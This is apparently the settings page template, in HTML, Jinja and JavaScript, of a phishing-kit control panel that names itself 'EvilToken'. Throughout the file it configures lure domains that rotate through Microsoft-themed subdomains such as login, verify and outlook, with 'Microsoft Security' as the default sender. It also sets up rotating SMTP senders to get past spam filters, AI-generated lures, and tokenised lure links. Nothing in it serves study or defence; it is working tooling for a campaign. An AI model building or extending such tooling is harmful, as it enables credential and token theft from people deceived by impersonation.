{% extends "base.html" %}
{% block title %}Settings{% endblock %}
{% block page_title %}⚙️ System Settings{% endblock %}

{% block content %}

<!-- ============================================================
SUBDOMAIN ROTATION - ADVANCED CONTROL
============================================================ -->
<div class="glass" style="border-left: 4px solid #ff9800; margin-bottom: 24px;">
    <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px;">
        <h3 style="margin: 0;"><i class="fas fa-globe" style="color: #ff9800;"></i> 🌐 Subdomain Rotation</h3>
        <span id="rotationBadge" style="font-size: 13px; padding: 4px 12px; border-radius: 12px; background: {% if settings.rotation_enabled == '1' %}rgba(76, 175, 80, 0.15){% else %}rgba(244, 67, 54, 0.15){% endif %}; color: {% if settings.rotation_enabled == '1' %}#4caf50{% else %}#f44336{% endif %};">
            {% if settings.rotation_enabled == '1' %}● ACTIVE{% else %}● INACTIVE{% endif %}
        </span>
    </div>
    
    <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">
        Automatically rotate through subdomains to improve email deliverability and avoid spam filters.
    </p>
    
    <!-- Status Grid -->
    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 12px; margin: 12px 0; padding: 16px; background: var(--bg-secondary); border-radius: 8px;">
        <div>
            <div style="font-size: 12px; color: var(--text-muted);">Current Subdomain</div>
            <div id="currentSubdomain" style="font-weight: bold; font-size: 18px; color: #4caf50;">{{ settings.current_subdomain or 'auth' }}</div>
        </div>
        <div>
            <div style="font-size: 12px; color: var(--text-muted);">Base URL</div>
            <div id="baseUrlDisplay" style="font-weight: bold; font-size: 14px; color: #2196f3; word-break: break-all;">{{ settings.base_url or 'https://auth.dltufurniture.com' }}</div>
        </div>
        <div>
            <div style="font-size: 12px; color: var(--text-muted);">Index (Position)</div>
            <div id="subdomainIndex" style="font-weight: bold; font-size: 18px; color: #9c27b0;">{{ settings.subdomain_index or '0' }}</div>
            <div style="font-size: 11px; color: var(--text-muted);">Next: 
                {% set subdomains = ['auth','secure','login','verify','account','portal','office','outlook','help','support','docs','teams'] %}
                {% set next_idx = (settings.subdomain_index|int + 1) % 12 %}
                {{ subdomains[next_idx] }}
            </div>
        </div>
        <div>
            <div style="font-size: 12px; color: var(--text-muted);">Status</div>
            <div id="rotationStatus" style="font-weight: bold; font-size: 16px; color: {% if settings.rotation_enabled == '1' %}#4caf50{% else %}#f44336{% endif %};">
                {% if settings.rotation_enabled == '1' %}✅ ENABLED{% else %}❌ DISABLED{% endif %}
            </div>
        </div>
    </div>
    
    <!-- Controls -->
    <div style="display: flex; flex-wrap: wrap; gap: 10px; align-items: center;">
        <div style="display: flex; gap: 6px;">
            <form action="/toggle_rotation" method="POST" style="display: inline;" id="enableForm">
                <button type="submit" class="btn btn-success" style="padding: 8px 20px; {% if settings.rotation_enabled == '1' %}display: none;{% endif %}">
                    <i class="fas fa-play"></i> Enable Rotation
                </button>
            </form>
            <form action="/toggle_rotation" method="POST" style="display: inline;" id="disableForm">
                <button type="submit" class="btn btn-danger" style="padding: 8px 20px; {% if settings.rotation_enabled == '0' %}display: none;{% endif %}">
                    <i class="fas fa-pause"></i> Disable Rotation
                </button>
            </form>
        </div>
        <a href="/rotate_now" class="btn btn-primary" style="padding: 8px 20px;">
            <i class="fas fa-sync"></i> Rotate Now
        </a>
        <form action="/set_subdomain" method="POST" style="display: inline-flex; gap: 8px; align-items: center; margin-left: 10px;">
            <select name="subdomain" style="padding: 8px 12px; border-radius: 6px; border: 1px solid var(--border); background: var(--input-bg); color: var(--text-primary);">
                {% set subdomains = ['auth','secure','login','verify','account','portal','office','outlook','help','support','docs','teams'] %}
                {% for sub in subdomains %}
                <option value="{{ sub }}" {% if settings.current_subdomain == sub %}selected{% endif %}>{{ sub }}</option>
                {% endfor %}
            </select>
            <button type="submit" class="btn btn-success">Set</button>
        </form>
    </div>
    
    <!-- Rotation Cycle Preview -->
    <div style="margin-top: 12px; padding: 12px; background: var(--bg-secondary); border-radius: 8px;">
        <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 6px;">Rotation Cycle:</div>
        <div id="cycleContainer" style="display: flex; flex-wrap: wrap; gap: 4px;">
            {% set subdomains = ['auth','secure','login','verify','account','portal','office','outlook','help','support','docs','teams'] %}
            {% for sub in subdomains %}
                {% if sub == settings.current_subdomain %}
                    <span style="padding: 2px 8px; border-radius: 4px; background: #4caf50; color: white; font-size: 12px; font-weight: bold;">{{ sub }}</span>
                {% else %}
                    <span style="padding: 2px 8px; border-radius: 4px; background: var(--border); color: var(--text-muted); font-size: 12px;">{{ sub }}</span>
                {% endif %}
            {% endfor %}
        </div>
        <div style="font-size: 11px; color: var(--text-muted); margin-top: 4px;">
            <span style="color: #4caf50;">●</span> Current &nbsp;|&nbsp; <span style="color: var(--text-muted);">○</span> Available
        </div>
    </div>
    
    <small style="color: var(--text-muted); margin-top: 8px; display: block; font-size: 12px;">
        <i class="fas fa-info-circle"></i> 
        <strong>How it works:</strong> When enabled, the system automatically rotates through subdomains to improve email deliverability.
        <br>
        <i class="fas fa-sync"></i> 
        <strong>Auto-Rotation:</strong> {% if settings.rotation_enabled == '1' %}✅ ENABLED - Will rotate on each campaign send{% else %}❌ DISABLED - Manual rotation only{% endif %}
    </small>
</div>

<!-- ============================================================
MAIN SETTINGS - SMTP & PERFORMANCE
============================================================ -->
<form method="POST" action="/settings">
<div style="display: grid; grid-template-columns: 1fr 1fr; gap: 24px; margin-bottom: 24px;">
    
    <!-- LEFT: SMTP Configuration -->
    <div class="glass" style="border-left: 4px solid #007bff;">
        <h3><i class="fas fa-envelope" style="color: #007bff;"></i> 📧 SMTP Configuration</h3>
        <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">Configure your primary email server.</p>
        
        <div class="form-group">
            <label>SMTP Server</label>
            <input type="text" name="smtp_server" value="{{ settings.smtp_server or '' }}" class="form-control" placeholder="smtp.office365.com">
        </div>
        <div class="form-group">
            <label>Port</label>
            <input type="number" name="smtp_port" value="{{ settings.smtp_port or '587' }}" class="form-control" placeholder="587">
        </div>
        <div class="form-group">
            <label>Username</label>
            <input type="text" name="smtp_username" value="{{ settings.smtp_username or '' }}" class="form-control" placeholder="user@domain.com">
        </div>
        <div class="form-group">
            <label>Password</label>
            <input type="password" name="smtp_password" value="{{ settings.smtp_password or '' }}" class="form-control" placeholder="••••••••">
        </div>
        <div class="form-group">
            <label>From Email</label>
            <input type="email" name="smtp_from" value="{{ settings.smtp_from or '' }}" class="form-control" placeholder="noreply@domain.com">
        </div>
        <div class="form-group">
            <label>Sender Name</label>
            <input type="text" name="sender_name" value="{{ settings.sender_name or 'Microsoft Security' }}" class="form-control" placeholder="Microsoft Security">
        </div>
    </div>
    
    <!-- RIGHT: Performance & AI -->
    <div class="glass" style="border-left: 4px solid #9c27b0;">
        <h3><i class="fas fa-sliders-h" style="color: #9c27b0;"></i> ⚡ Performance & AI</h3>
        <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">Configure sending limits and AI features.</p>
        
        <div class="form-group">
            <label>Base URL</label>
            <input type="text" name="base_url" value="{{ settings.base_url or '' }}" class="form-control" placeholder="https://your-domain.com">
        </div>
        <div class="form-group">
            <label>Max Threads</label>
            <select name="max_workers" class="form-control">
                <option value="2" {% if settings.max_workers == '2' %}selected{% endif %}>2 - Slow (60/min)</option>
                <option value="5" {% if settings.max_workers == '5' %}selected{% endif %}>5 - Normal (150/min)</option>
                <option value="10" {% if settings.max_workers == '10' %}selected{% endif %}>10 - Fast (300/min)</option>
                <option value="15" {% if settings.max_workers == '15' %}selected{% endif %}>15 - Turbo (450/min)</option>
                <option value="20" {% if settings.max_workers == '20' %}selected{% endif %}>20 - Max (600/min)</option>
            </select>
        </div>
        <div class="form-group">
            <label>Rate Limit (per minute)</label>
            <input type="number" name="rate_limit_per_minute" value="{{ settings.rate_limit_per_minute or '60' }}" class="form-control" placeholder="60">
        </div>
        
        <hr style="margin: 16px 0;">
        
        <div class="form-group">
            <label>OpenAI API Key</label>
            <input type="password" name="openai_api_key" value="{{ settings.openai_api_key or '' }}" class="form-control" placeholder="sk-...">
        </div>
        <div class="form-group" style="display: flex; align-items: center; gap: 12px; margin-bottom: 0;">
            <label style="margin: 0; cursor: pointer;">Enable AI Lures</label>
            <input type="checkbox" name="enable_ai_lures" value="true" {% if settings.enable_ai_lures == 'true' %}checked{% endif %} style="width: 18px; height: 18px; cursor: pointer;">
            <span style="font-size: 12px; color: var(--text-muted);">(requires OpenAI key)</span>
        </div>
    </div>
</div>

<!-- ============================================================
SAVE BUTTON
============================================================ -->
<div style="margin-bottom: 24px;">
    <button type="submit" class="btn btn-primary" style="padding: 12px 32px; width: 100%;">
        <i class="fas fa-save"></i> Save All Settings
    </button>
</div>
</form>

<!-- ============================================================
SMTP ROTATION PROVIDERS
============================================================ -->
<div class="glass" style="border-left: 4px solid #28a745; margin-bottom: 24px;">
    <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px;">
        <h3 style="margin: 0;"><i class="fas fa-exchange-alt" style="color: #28a745;"></i> 🔄 SMTP Rotation Providers</h3>
        <span style="font-size: 13px; color: var(--text-muted);">{{ smtp_providers|length }} providers</span>
    </div>
    <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">Add multiple SMTP providers for automatic rotation and failover.</p>
    
    <!-- Add Provider -->
    <div style="background: var(--bg-secondary); padding: 16px; border-radius: 8px; margin-bottom: 16px;">
        <h4 style="margin: 0 0 12px 0; font-size: 15px;">➕ Add New Provider</h4>
        <form action="/smtp/add" method="POST">
            <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px;">
                <input type="text" name="name" placeholder="Provider Name" class="form-control" required>
                <input type="text" name="server" placeholder="SMTP Server" class="form-control" required>
                <input type="number" name="port" placeholder="Port" value="587" class="form-control" required>
                <input type="text" name="username" placeholder="Username" class="form-control" required>
                <input type="password" name="password" placeholder="Password" class="form-control" required>
                <input type="email" name="from_email" placeholder="From Email" class="form-control" required>
            </div>
            <button type="submit" class="btn btn-success" style="margin-top: 10px;">
                <i class="fas fa-plus"></i> Add Provider
            </button>
        </form>
    </div>
    
    <!-- Providers List -->
    {% if smtp_providers %}
    <div class="table-wrap">
        <table>
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Server</th>
                    <th>From</th>
                    <th style="text-align: center;">Status</th>
                    <th style="text-align: center;">Score</th>
                    <th style="text-align: center;">Actions</th>
                </tr>
            </thead>
            <tbody>
                {% for p in smtp_providers %}
                <tr>
                    <td><strong>{{ p.name }}</strong></td>
                    <td>{{ p.server }}</td>
                    <td>{{ p.from_email }}</td>
                    <td style="text-align: center;">
                        {% if p.enabled %}
                            <span style="color: #4caf50;">● Active</span>
                        {% else %}
                            <span style="color: #f44336;">● Inactive</span>
                        {% endif %}
                    </td>
                    <td style="text-align: center;">
                        <span style="background: var(--bg-secondary); padding: 2px 12px; border-radius: 12px; font-size: 13px;">{{ p.score or 100 }}</span>
                    </td>
                    <td style="text-align: center; white-space: nowrap;">
                        <form action="/smtp/{{ p.id }}/toggle" method="POST" style="display: inline;">
                            <button type="submit" class="btn btn-sm {% if p.enabled %}btn-warning{% else %}btn-success{% endif %}">
                                {% if p.enabled %}Disable{% else %}Enable{% endif %}
                            </button>
                        </form>
                        <button class="btn btn-sm btn-primary" onclick="testSmtp({{ p.id }}, '{{ p.name }}')">Test</button>
                        <form action="/smtp/{{ p.id }}/delete" method="POST" style="display: inline;">
                            <button type="submit" class="btn btn-sm btn-danger" onclick="return confirm('Delete this provider?')">
                                <i class="fas fa-trash"></i>
                            </button>
                        </form>
                    </td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    </div>
    {% else %}
    <p style="color: var(--text-muted); text-align: center; padding: 20px 0;">No SMTP providers added yet.</p>
    {% endif %}
</div>

<!-- ============================================================
TEST EMAIL
============================================================ -->
<div class="glass" style="border-left: 4px solid #17a2b8; margin-bottom: 24px;">
    <h3><i class="fas fa-paper-plane" style="color: #17a2b8;"></i> 📤 Send Test Email</h3>
    <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">Verify your SMTP configuration by sending a test email.</p>
    
    <div style="display: flex; gap: 12px; flex-wrap: wrap; align-items: center;">
        <input type="email" id="testEmailInput" placeholder="Enter recipient email..." style="flex: 2; min-width: 250px; padding: 10px 16px; border-radius: 6px; border: 1px solid var(--border); background: var(--input-bg); color: var(--text-primary);">
        <input type="text" id="testSubjectInput" placeholder="Subject (optional)" style="flex: 1; min-width: 150px; padding: 10px 16px; border-radius: 6px; border: 1px solid var(--border); background: var(--input-bg); color: var(--text-primary);">
        <button onclick="sendTestEmailWithInput()" class="btn btn-primary" style="padding: 10px 24px;">
            <i class="fas fa-paper-plane"></i> Send
        </button>
    </div>
    <div id="testEmailResult" style="margin-top: 12px; display: none; padding: 10px; border-radius: 6px;"></div>
</div>

<script>
function sendTestEmailWithInput() {
    const email = document.getElementById('testEmailInput').value;
    const subject = document.getElementById('testSubjectInput').value || 'Test Email';
    const resultDiv = document.getElementById('testEmailResult');
    
    if (!email) {
        resultDiv.style.display = 'block';
        resultDiv.style.background = 'rgba(244, 67, 54, 0.1)';
        resultDiv.style.color = '#f44336';
        resultDiv.innerHTML = '❌ Please enter a recipient email address.';
        return;
    }
    
    resultDiv.style.display = 'block';
    resultDiv.style.background = 'rgba(33, 150, 243, 0.1)';
    resultDiv.style.color = '#2196f3';
    resultDiv.innerHTML = '📤 Sending test email...';
    
    const formData = new FormData();
    formData.append('test_email', email);
    formData.append('subject', subject);
    formData.append('body', '<p>Test email from EvilToken</p>');
    
    fetch('/test_email', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            resultDiv.style.background = 'rgba(76, 175, 80, 0.1)';
            resultDiv.style.color = '#4caf50';
            resultDiv.innerHTML = '✅ ' + data.message;
        } else {
            resultDiv.style.background = 'rgba(244, 67, 54, 0.1)';
            resultDiv.style.color = '#f44336';
            resultDiv.innerHTML = '❌ ' + (data.error || 'Failed to send test email.');
        }
    })
    .catch(error => {
        resultDiv.style.background = 'rgba(244, 67, 54, 0.1)';
        resultDiv.style.color = '#f44336';
        resultDiv.innerHTML = '❌ Error: ' + error.message;
    });
}

function testSmtp(id, name) {
    const email = prompt('Enter test email address for ' + name + ':');
    if (!email) return;
    
    const formData = new FormData();
    formData.append('provider_id', id);
    formData.append('test_email', email);
    
    fetch('/smtp/test', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            alert('✅ Test email sent via ' + name);
        } else {
            alert('❌ Failed via ' + name + ': ' + (data.error || 'Unknown error'));
        }
    })
    .catch(error => alert('Error: ' + error.message));
}

// ============================================================
// DYNAMIC SUBDOMAIN STATUS UPDATER
// ============================================================
function updateSubdomainStatus() {
    fetch('/api/subdomain_status')
        .then(response => response.json())
        .then(data => {
            // Update current subdomain
            const currentEl = document.getElementById('currentSubdomain');
            if (currentEl) currentEl.textContent = data.current_subdomain || 'auth';
            
            // Update base URL
            const baseUrlEl = document.getElementById('baseUrlDisplay');
            if (baseUrlEl) baseUrlEl.textContent = data.base_url || '';
            
            // Update index
            const indexEl = document.getElementById('subdomainIndex');
            if (indexEl) indexEl.textContent = data.subdomain_index || '0';
            
            // Update rotation status
            const statusEl = document.getElementById('rotationStatus');
            const badgeEl = document.getElementById('rotationBadge');
            const enableBtn = document.querySelector('#enableForm button');
            const disableBtn = document.querySelector('#disableForm button');
            
            if (data.rotation_enabled == 1) {
                if (statusEl) {
                    statusEl.textContent = '✅ ENABLED';
                    statusEl.style.color = '#4caf50';
                }
                if (badgeEl) {
                    badgeEl.textContent = '● Active';
                    badgeEl.style.color = '#4caf50';
                }
                if (enableBtn) enableBtn.style.display = 'none';
                if (disableBtn) disableBtn.style.display = 'inline-flex';
            } else {
                if (statusEl) {
                    statusEl.textContent = '❌ DISABLED';
                    statusEl.style.color = '#f44336';
                }
                if (badgeEl) {
                    badgeEl.textContent = '● Inactive';
                    badgeEl.style.color = '#f44336';
                }
                if (enableBtn) enableBtn.style.display = 'inline-flex';
                if (disableBtn) disableBtn.style.display = 'none';
            }
            
            // Update rotation cycle display
            const cycleContainer = document.getElementById('cycleContainer');
            if (cycleContainer) {
                const subdomains = ['auth','secure','login','verify','account','portal','office','outlook','help','support','docs','teams'];
                let html = '';
                for (const sub of subdomains) {
                    if (sub === data.current_subdomain) {
                        html += `<span style="padding: 2px 8px; border-radius: 4px; background: #4caf50; color: white; font-size: 12px; font-weight: bold;">${sub}</span>`;
                    } else {
                        html += `<span style="padding: 2px 8px; border-radius: 4px; background: var(--border); color: var(--text-muted); font-size: 12px;">${sub}</span>`;
                    }
                }
                cycleContainer.innerHTML = html;
            }
        })
        .catch(() => {});
}

// Update every 3 seconds
setInterval(updateSubdomainStatus, 3000);
document.addEventListener('DOMContentLoaded', updateSubdomainStatus);
</script>

<style>
    .glass {
        background: var(--card-bg);
        padding: 24px;
        border-radius: 12px;
        border: 1px solid var(--border);
        transition: all 0.3s ease;
    }
    .glass:hover {
        box-shadow: 0 4px 20px rgba(0,0,0,0.05);
    }
    .form-group {
        margin-bottom: 14px;
    }
    .form-group label {
        display: block;
        font-size: 13px;
        font-weight: 500;
        margin-bottom: 4px;
        color: var(--text-secondary);
    }
    .form-control {
        width: 100%;
        padding: 8px 12px;
        border-radius: 6px;
        border: 1px solid var(--border);
        background: var(--input-bg);
        color: var(--text-primary);
        transition: border-color 0.2s;
        font-size: 14px;
    }
    .form-control:focus {
        outline: none;
        border-color: #007bff;
    }
    .btn {
        padding: 8px 16px;
        border-radius: 6px;
        border: none;
        cursor: pointer;
        font-weight: 500;
        font-size: 14px;
        text-decoration: none;
        display: inline-flex;
        align-items: center;
        gap: 6px;
        transition: all 0.2s;
    }
    .btn:hover { opacity: 0.85; }
    .btn-primary { background: #007bff; color: white; }
    .btn-success { background: #28a745; color: white; }
    .btn-danger { background: #dc3545; color: white; }
    .btn-warning { background: #ff9800; color: white; }
    .btn-sm { padding: 4px 10px; font-size: 12px; }
    .table-wrap { overflow-x: auto; margin-top: 8px; }
    table { width: 100%; border-collapse: collapse; font-size: 14px; }
    th { text-align: left; padding: 10px 12px; border-bottom: 2px solid var(--border); font-weight: 600; color: var(--text-secondary); font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
    td { padding: 10px 12px; border-bottom: 1px solid var(--border); }
    tr:hover td { background: var(--bg-secondary); }
    hr { border: none; border-top: 1px solid var(--border); margin: 16px 0; }
</style>

{% endblock %}

<!-- ============================================================
LURE DOMAIN MANAGEMENT - CHANGE YOUR LURE DOMAIN EASILY
============================================================ -->
<div class="glass" style="border-left: 4px solid #9c27b0; margin-top: 24px; border-radius: 12px; padding: 20px;">
    <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; margin-bottom: 16px;">
        <h3 style="margin: 0;"><i class="fas fa-globe" style="color: #9c27b0;"></i> 🎯 Lure Domain Management</h3>
        <span style="font-size: 12px; padding: 4px 12px; border-radius: 12px; background: rgba(156, 39, 176, 0.15); color: #9c27b0;">
            <i class="fas fa-check-circle"></i> Change anytime
        </span>
    </div>

    <div class="alert alert-info" style="padding: 12px 16px; border-radius: 8px; background: rgba(33, 150, 243, 0.08); border-left: 3px solid #2196f3; margin-bottom: 16px;">
        <i class="fas fa-info-circle"></i>
        <strong>Current Lure Domain:</strong> 
        <code id="currentLureDomain" style="background: rgba(0,0,0,0.1); padding: 2px 8px; border-radius: 4px;">{{ settings.base_url or 'https://auth.dltufurniture.com' }}</code>
        <br>
        <small style="color: var(--text-muted);">All lure links use this domain. Change it to a new domain after setting up DNS.</small>
    </div>

    <form id="domainForm" onsubmit="updateLureDomain(event)" style="margin-top: 12px;">
        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 16px;">
            <div>
                <label style="font-weight: 600; display: block; margin-bottom: 4px;">New Domain Name</label>
                <input type="text" id="newLureDomain" class="form-control" 
                       placeholder="e.g., newdomain.com" 
                       style="width: 100%; padding: 10px 14px; border-radius: 6px; border: 1px solid var(--border); background: var(--input-bg); color: var(--text-primary);">
                <small style="color: var(--text-muted);">Enter only the domain (without https:// or www.)</small>
            </div>
            <div>
                <label style="font-weight: 600; display: block; margin-bottom: 4px;">Subdomains (comma separated)</label>
                <input type="text" id="newLureSubdomains" class="form-control" 
                       value="auth, secure, login, verify, account, portal, office, outlook, help, support, docs, teams"
                       style="width: 100%; padding: 10px 14px; border-radius: 6px; border: 1px solid var(--border); background: var(--input-bg); color: var(--text-primary);">
                <small style="color: var(--text-muted);">These will become: https://SUBDOMAIN.YOURDOMAIN.com/c/token</small>
            </div>
        </div>

        <!-- Preview Section -->
        <div id="domainPreview" style="display: none; padding: 12px 16px; border-radius: 8px; background: rgba(76, 175, 80, 0.08); border-left: 3px solid #4caf50; margin-bottom: 16px;">
            <strong style="color: #4caf50;"><i class="fas fa-eye"></i> Preview:</strong>
            <div id="previewLinks" style="margin-top: 6px; font-size: 13px; color: var(--text-muted);"></div>
        </div>

        <div style="display: flex; gap: 10px; flex-wrap: wrap;">
            <button type="submit" class="btn btn-primary" style="padding: 10px 24px; border-radius: 6px; background: #9c27b0; color: white; border: none; cursor: pointer; font-weight: 600;">
                <i class="fas fa-sync-alt"></i> Update Lure Domain
            </button>
            <button type="button" class="btn btn-secondary" onclick="resetToDefaultDomain()" style="padding: 10px 24px; border-radius: 6px; background: var(--bg-secondary); border: 1px solid var(--border); cursor: pointer;">
                <i class="fas fa-undo"></i> Reset to Default
            </button>
        </div>

        <div id="domainUpdateStatus" style="margin-top: 12px;"></div>
    </form>

    <small style="color: var(--text-muted); margin-top: 12px; display: block; font-size: 12px;">
        <i class="fas fa-exclamation-triangle" style="color: #ff9800;"></i> 
        <strong>Important:</strong> Before updating, make sure your new domain's DNS records are configured with all subdomains pointing to your server IP.
    </small>
</div>

<!-- JavaScript for Domain Management -->
<script>
// Domain management functions
function loadCurrentDomain() {
    fetch('/api/domain_status')
        .then(res => res.json())
        .then(data => {
            document.getElementById('currentLureDomain').textContent = data.base_url;
            document.getElementById('newLureDomain').value = data.domain;
            if (data.subdomains && data.subdomains.length > 0) {
                document.getElementById('newLureSubdomains').value = data.subdomains.join(', ');
            }
            showDomainPreview();
        })
        .catch(err => console.log('Domain status load error:', err));
}

function showDomainPreview() {
    const domain = document.getElementById('newLureDomain').value.trim();
    const subdomains = document.getElementById('newLureSubdomains').value.split(',').map(s => s.trim()).filter(s => s);
    
    if (domain && subdomains.length > 0) {
        const previewDiv = document.getElementById('domainPreview');
        previewDiv.style.display = 'block';
        let html = '';
        subdomains.slice(0, 3).forEach(s => {
            html += `<code>https://${s}.${domain}/c/token</code><br>`;
        });
        if (subdomains.length > 3) {
            html += `<span class="text-muted">...and ${subdomains.length - 3} more subdomains</span>`;
        }
        document.getElementById('previewLinks').innerHTML = html;
    } else {
        document.getElementById('domainPreview').style.display = 'none';
    }
}

function updateLureDomain(event) {
    event.preventDefault();
    
    const domain = document.getElementById('newLureDomain').value.trim();
    const subdomains = document.getElementById('newLureSubdomains').value.split(',').map(s => s.trim()).filter(s => s);
    
    if (!domain) {
        alert('⚠️ Please enter a domain name');
        return;
    }
    
    if (subdomains.length < 2) {
        alert('⚠️ Please enter at least 2 subdomains');
        return;
    }
    
    if (!confirm(`⚠️ This will change ALL your lure links to:\n\nhttps://${subdomains[0]}.${domain}/c/token\nhttps://${subdomains[1]}.${domain}/c/token\n...and ${subdomains.length - 2} more\n\nContinue?`)) {
        return;
    }
    
    const statusDiv = document.getElementById('domainUpdateStatus');
    statusDiv.innerHTML = '<div style="padding: 10px 16px; border-radius: 6px; background: rgba(33, 150, 243, 0.1); border-left: 3px solid #2196f3; color: #2196f3;">⏳ Updating domain...</div>';
    
    fetch('/api/update_domain', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            domain: domain,
            subdomains: subdomains 
        })
    })
    .then(res => res.json())
    .then(data => {
        if (data.error) {
            statusDiv.innerHTML = `<div style="padding: 10px 16px; border-radius: 6px; background: rgba(244, 67, 54, 0.1); border-left: 3px solid #f44336; color: #f44336;">❌ ${data.error}</div>`;
        } else {
            statusDiv.innerHTML = `<div style="padding: 10px 16px; border-radius: 6px; background: rgba(76, 175, 80, 0.1); border-left: 3px solid #4caf50; color: #4caf50;">✅ ${data.message}</div>`;
            setTimeout(() => location.reload(), 2000);
        }
    })
    .catch(err => {
        statusDiv.innerHTML = `<div style="padding: 10px 16px; border-radius: 6px; background: rgba(244, 67, 54, 0.1); border-left: 3px solid #f44336; color: #f44336;">❌ Error: ${err.message}</div>`;
    });
}

function resetToDefaultDomain() {
    if (confirm('Reset to default domain (dltufurniture.com) and subdomains?')) {
        document.getElementById('newLureDomain').value = 'dltufurniture.com';
        document.getElementById('newLureSubdomains').value = 'auth, secure, login, verify, account, portal, office, outlook, help, support, docs, teams';
        showDomainPreview();
    }
}

// Live preview on input change
document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('newLureDomain').addEventListener('input', showDomainPreview);
    document.getElementById('newLureSubdomains').addEventListener('input', showDomainPreview);
    loadCurrentDomain();
});
</script>
